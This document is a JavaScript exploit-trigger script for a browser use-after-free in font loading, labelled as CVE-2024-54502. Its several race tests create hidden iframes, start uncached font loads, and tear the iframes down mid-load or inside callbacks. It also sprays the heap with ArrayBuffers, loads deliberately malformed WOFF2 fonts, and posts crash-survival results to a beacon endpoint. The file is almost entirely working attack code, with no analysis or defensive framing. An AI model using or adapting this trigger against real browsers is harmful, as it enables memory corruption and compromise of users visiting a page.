/* p98-uaf-race — CVE-2024-54502 corrected trigger
 *
 * KEY INSIGHT: The bug requires DocumentFontLoader's TIMER to fire
 * AFTER the Document is freed. If fonts load from cache, no timer
 * is ever set. We must:
 * 1. Each iframe loads a UNIQUE uncached font URL (cache busters)
 * 2. Remove iframe WHILE font is still loading (not after)
 * 3. DocumentFontLoader timer fires on freed Document → UAF
 *
 * Beacon prefix: V98R-
 */
(function(){
"use strict";
var RUN_ID = "v98r" + Math.random().toString(36).slice(2,12);
var PREFIX = "V98R-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press98-uaf-race");

/* ====== R1: Remove iframe DURING font network load ====== */
function test_R1() {
  var r = {};
  try {
    var NUM = 12;
    var created = 0;
    var removed = 0;

    for (var i = 0; i < NUM; i++) {
      (function(idx) {
        var iframe = document.createElement('iframe');
        iframe.id = 'r1_' + idx;
        iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

        document.body.appendChild(iframe);
        created++;

        try {
          var doc = iframe.contentDocument;
          doc.open();
          // Each iframe loads a UNIQUE font URL — cache busters prevent caching
          // f0.ttf through f32.ttf exist on server — use different ones + query params
          var fontFile = 'f' + (idx % 10) + '.ttf?nocache=' + RUN_ID + '_' + idx + '_' + Date.now();
          doc.write('<!doctype html><html><head><style>' +
            '@font-face{font-family:"race' + idx + '";src:url(' + fontFile + ') format("truetype")}' +
            'body{font-family:"race' + idx + '",sans-serif;font-size:72px}' +
            '</style></head><body>LOADING FONT ' + idx + '</body></html>');
          doc.close();
        } catch(e) {}

        // Remove iframe IMMEDIATELY — while font is still loading from network
        // Don't wait for onload — that's too late
        setTimeout(function() {
          var el = document.getElementById('r1_' + idx);
          if (el) {
            el.remove();
            removed++;
          }
        }, 0); // next microtask — font request started but not completed
      })(i);
    }

    setTimeout(function() {
      r.created = created;
      r.removed = removed;
      r.SURVIVED = true;
      B("R1-IMMEDIATE-REMOVE", r);
    }, 4000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("R1-ERR", r); }
}

/* ====== R2: Staggered removal — remove at various delays during font load ====== */
function test_R2() {
  var r = {};
  try {
    var NUM = 20;
    var created = 0;
    var removed = 0;
    var delays = [0, 1, 2, 5, 10, 15, 20, 30, 50, 75, 100, 150, 200, 250, 300, 400, 500, 750, 1000, 1500];

    for (var i = 0; i < NUM; i++) {
      (function(idx, delay) {
        var iframe = document.createElement('iframe');
        iframe.id = 'r2_' + idx;
        iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

        document.body.appendChild(iframe);
        created++;

        try {
          var doc = iframe.contentDocument;
          doc.open();
          var fontFile = 'f' + (idx % 15) + '.ttf?bust=' + RUN_ID + '_r2_' + idx + '_' + Date.now();
          doc.write('<!doctype html><html><head><style>' +
            '@font-face{font-family:"stag' + idx + '";src:url(' + fontFile + ') format("truetype")}' +
            'body{font-family:"stag' + idx + '",sans-serif;font-size:48px}' +
            '</style></head><body>STAGGER ' + idx + '</body></html>');
          doc.close();
        } catch(e) {}

        // Remove at varying delays to find the race window
        setTimeout(function() {
          var el = document.getElementById('r2_' + idx);
          if (el) {
            el.remove();
            removed++;
          }
        }, delay);
      })(i, delays[i]);
    }

    setTimeout(function() {
      r.created = created;
      r.removed = removed;
      r.SURVIVED = true;
      B("R2-STAGGERED", r);
    }, 5000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("R2-ERR", r); }
}

/* ====== R3: FontFace API — start load then remove iframe ====== */
function test_R3() {
  var r = {};
  try {
    var NUM = 10;
    var started = 0;
    var removed = 0;

    for (var i = 0; i < NUM; i++) {
      (function(idx) {
        var iframe = document.createElement('iframe');
        iframe.id = 'r3_' + idx;
        iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

        iframe.onload = function() {
          try {
            var idoc = iframe.contentDocument;
            var iwin = iframe.contentWindow;
            if (!iwin || !iwin.FontFace) { return; }

            // Use FontFace API to start loading — gives us precise timing
            var fontFile = 'f' + (idx % 20) + '.ttf?api=' + RUN_ID + '_r3_' + idx;
            var ff = new iwin.FontFace('apiFont' + idx, 'url(' + fontFile + ')');
            idoc.fonts.add(ff);
            ff.load(); // Start async font load
            started++;

            // Remove iframe while font is loading — DocumentFontLoader timer should be active
            setTimeout(function() {
              var el = document.getElementById('r3_' + idx);
              if (el) {
                el.remove();
                removed++;
              }
            }, 1); // 1ms — font request issued but response not arrived
          } catch(e) {}
        };

        document.body.appendChild(iframe);
        try {
          iframe.contentDocument.open();
          iframe.contentDocument.write('<!doctype html><html><head></head><body></body></html>');
          iframe.contentDocument.close();
        } catch(e) {
          iframe.srcdoc = '<!doctype html><html><head></head><body></body></html>';
        }
      })(i);
    }

    setTimeout(function() {
      r.started = started;
      r.removed = removed;
      r.SURVIVED = true;
      B("R3-FONTFACE-API", r);
    }, 5000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("R3-ERR", r); }
}

/* ====== R4: Promise resolution re-entrancy — remove during loadDone ====== */
function test_R4() {
  var r = {};
  try {
    var NUM = 10;
    var loaded = 0;
    var removed = 0;

    for (var i = 0; i < NUM; i++) {
      (function(idx) {
        var iframe = document.createElement('iframe');
        iframe.id = 'r4_' + idx;
        iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

        iframe.onload = function() {
          try {
            var iwin = iframe.contentWindow;
            var idoc = iframe.contentDocument;
            if (!iwin || !iwin.FontFace) return;

            var fontFile = 'f' + (idx % 25) + '.ttf?r4=' + RUN_ID + '_' + idx;
            var ff = new iwin.FontFace('reent' + idx, 'url(' + fontFile + ')');
            idoc.fonts.add(ff);

            // When font loads, the promise resolves inside loadDone()
            // If we remove the iframe HERE, during the callback chain,
            // other pending work in fontLoadingTimerFired crashes
            ff.loaded.then(function() {
              loaded++;
              // Remove during the promise resolution of font load completion
              var el = document.getElementById('r4_' + idx);
              if (el) {
                el.remove();
                removed++;
              }
            }).catch(function(){});

            ff.load();
          } catch(e) {}
        };

        document.body.appendChild(iframe);
        try {
          iframe.contentDocument.open();
          iframe.contentDocument.write('<!doctype html><html><body></body></html>');
          iframe.contentDocument.close();
        } catch(e) {
          iframe.srcdoc = '<!doctype html><html><body></body></html>';
        }
      })(i);
    }

    setTimeout(function() {
      r.loaded = loaded;
      r.removed = removed;
      r.SURVIVED = true;
      B("R4-REENTRANT", r);
    }, 6000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("R4-ERR", r); }
}

/* ====== R5: documents.fonts.onloadingdone + GC pressure ====== */
function test_R5() {
  var r = {};
  try {
    var NUM = 8;
    var triggered = 0;

    for (var i = 0; i < NUM; i++) {
      (function(idx) {
        var iframe = document.createElement('iframe');
        iframe.id = 'r5_' + idx;
        iframe.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px;';

        iframe.onload = function() {
          try {
            var iwin = iframe.contentWindow;
            var idoc = iframe.contentDocument;
            if (!idoc.fonts) return;

            // Register onloadingdone — fires when all fonts finish loading
            idoc.fonts.onloadingdone = function() {
              triggered++;
              // Remove iframe during this callback — Document is being used
              // by DocumentFontLoader to dispatch this event
              var el = document.getElementById('r5_' + idx);
              if (el) el.remove();

              // GC pressure — try to reclaim Document memory
              var spray = [];
              for (var s = 0; s < 200; s++) {
                spray.push(new ArrayBuffer(1024));
              }
            };

            // Start font load
            var fontFile = 'f' + (idx % 30) + '.ttf?r5=' + RUN_ID + '_' + idx;
            var ff = new iwin.FontFace('done' + idx, 'url(' + fontFile + ')');
            idoc.fonts.add(ff);
            ff.load();
          } catch(e) {}
        };

        document.body.appendChild(iframe);
        try {
          iframe.contentDocument.open();
          iframe.contentDocument.write('<!doctype html><html><body></body></html>');
          iframe.contentDocument.close();
        } catch(e) {
          iframe.srcdoc = '<!doctype html><html><body></body></html>';
        }
      })(i);
    }

    setTimeout(function() {
      r.triggered = triggered;
      r.SURVIVED = true;
      B("R5-LOADINGDONE", r);
    }, 6000);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("R5-ERR", r); }
}

/* ====== R6: WOFF2 variants with T5's results pending ====== */
function test_R6() {
  var r = {};
  try {
    var files = ['evil-woff2-valid.woff2', 'evil-woff2-small-glyf.woff2',
      'evil-woff2-zero-glyf.woff2', 'evil-woff2-sfnt-mismatch.woff2',
      'evil-woff2-bad-comp.woff2'];
    var idx = 0;
    var results = [];

    function testNext() {
      if (idx >= files.length) {
        r.woff2Results = results.join('|');
        B("R6-WOFF2", r);
        return;
      }
      var fname = files[idx];
      var fontName = 'W2_' + idx;
      var style = document.createElement('style');
      style.textContent = '@font-face{font-family:"' + fontName + '";src:url(' + fname + '?v2=' + RUN_ID + ') format("woff2")}';
      document.head.appendChild(style);
      var div = document.createElement('div');
      div.style.cssText = 'font-family:"' + fontName + '",sans-serif;position:absolute;left:-9999px;font-size:72px;';
      div.textContent = 'WOFF2 TEST';
      document.body.appendChild(div);
      var w1 = div.offsetWidth;

      setTimeout(function() {
        var w2 = div.offsetWidth;
        var loaded = w1 !== w2;
        results.push(fname.replace('evil-woff2-','').replace('.woff2','') + ':' + (loaded ? 'LOADED' : 'rej'));
        style.remove();
        div.remove();
        idx++;
        testNext();
      }, 1500);
    }
    testNext();
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("R6-WOFF2", r); }
}

/* ====== Run ====== */
try {
  test_R1();                    // Immediate removal (0ms)
  setTimeout(test_R2, 6000);    // Staggered delays (6s)
  setTimeout(test_R3, 14000);   // FontFace API (14s)
  setTimeout(test_R4, 22000);   // Re-entrant promise (22s)
  setTimeout(test_R5, 30000);   // onloadingdone (30s)
  setTimeout(test_R6, 38000);   // WOFF2 loading (38s)
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe98-done"); }, 60000);
})();
